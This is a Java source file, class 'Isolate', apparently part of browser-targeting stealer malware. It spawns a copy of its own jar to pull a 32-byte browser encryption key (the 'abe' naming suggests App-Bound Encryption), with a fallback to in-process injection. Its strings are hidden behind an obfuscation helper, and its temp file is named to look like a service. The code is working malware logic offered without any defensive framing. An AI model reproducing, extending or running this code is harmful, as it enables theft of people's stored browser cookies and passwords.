package noface.browsers.abe;

import noface.browsers.Paths;
import noface.config.Log;
import noface.config.S;

import java.io.File;
import java.net.URI;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.jar.JarFile;

public final class Isolate {

    private static final int WAIT_SEC = 25;

    public static Attempt run(Paths.Def browser) {
        if (browser == null) return Attempt.fail(S.e("no_browser"));
        Path jar = selfJar();
        String java = javaBin();
        if (jar != null && java != null) {
            Attempt a = child(jar, java, browser);
            if (a.ok()) return a;
            Log.out(S.e("abe iso fallback ") + browser.name() + " " + (a.reason() == null ? "" : a.reason()));
        } else {
            Log.out(S.e("abe iso inproc ") + browser.name());
        }
        return Inject.run(browser);
    }

    private static Attempt child(Path jar, String java, Paths.Def browser) {
        Path out = null;
        try {
            out = Files.createTempFile(S.e("wsvc-abe-"), S.e(".bin"));
            List<String> cmd = new ArrayList<>();
            cmd.add(java);
            cmd.add(S.e("--enable-native-access=ALL-UNNAMED"));
            cmd.add(S.e("-jar"));
            cmd.add(jar.toAbsolutePath().toString());
            cmd.add(S.e("abe"));
            cmd.add(browser.name());
            cmd.add(out.toAbsolutePath().toString());
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            Process p = pb.start();
            boolean done = p.waitFor(WAIT_SEC, TimeUnit.SECONDS);
            if (!done) {
                p.destroyForcibly();
                try { p.waitFor(3, TimeUnit.SECONDS); } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                }
                Log.out(S.e("abe iso timeout ") + browser.name());
                return Attempt.fail(S.e("timeout"));
            }
            int code = p.exitValue();
            if (code != 0) {
                String why = "";
                try {
                    Path whyPath = Path.of(out.toAbsolutePath() + ".why");
                    if (Files.isRegularFile(whyPath)) {
                        why = Files.readString(whyPath).trim();
                        Files.deleteIfExists(whyPath);
                    }
                } catch (Throwable ignored) {
                }
                Log.out(S.e("abe iso exit=") + code + " " + browser.name()
                        + (why.isEmpty() ? "" : (S.e(" ") + why)));
                return Attempt.fail(why.isEmpty() ? (S.e("exit_") + code) : why);
            }
            if (!Files.isRegularFile(out) || Files.size(out) != 32) {
                return Attempt.fail(S.e("bad_out"));
            }
            byte[] key = Files.readAllBytes(out);
            if (!Valid.ok(key)) return Attempt.fail(S.e("bad_key"));
            return Attempt.win(key);
        } catch (Throwable t) {
            Log.out(S.e("abe iso err: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            return Attempt.fail(S.e("iso_err"));
        } finally {
            if (out != null) {
                try { Files.deleteIfExists(out); } catch (Throwable ignored) {}
            }
        }
    }

    private static String javaBin() {
        try {
            return ProcessHandle.current().info().command().orElse(null);
        } catch (Throwable t) {
            return null;
        }
    }

    private static Path selfJar() {
        try {
            URL loc = Isolate.class.getProtectionDomain().getCodeSource().getLocation();
            if (loc != null) {
                Path p = Path.of(URI.create(loc.toURI().toString()));
                if (ours(p)) return p;
            }
        } catch (Throwable ignored) {
        }
        String cp = System.getProperty("java.class.path", "");
        for (String part : cp.split(File.pathSeparator)) {
            if (part == null || part.isBlank()) continue;
            try {
                Path p = Path.of(part.trim());
                if (ours(p)) return p.toAbsolutePath();
            } catch (Throwable ignored) {
            }
        }
        return null;
    }

    private static boolean ours(Path p) {
        if (p == null || !Files.isRegularFile(p)) return false;
        String n = p.getFileName().toString().toLowerCase();
        if (!n.endsWith(".jar")) return false;
        try (JarFile jf = new JarFile(p.toFile())) {
            return jf.getEntry("noface/browsers/Boot.class") != null
                    || jf.getEntry("nf/rt/Launch.class") != null;
        } catch (Throwable t) {
            return false;
        }
    }

    private Isolate() {}
}
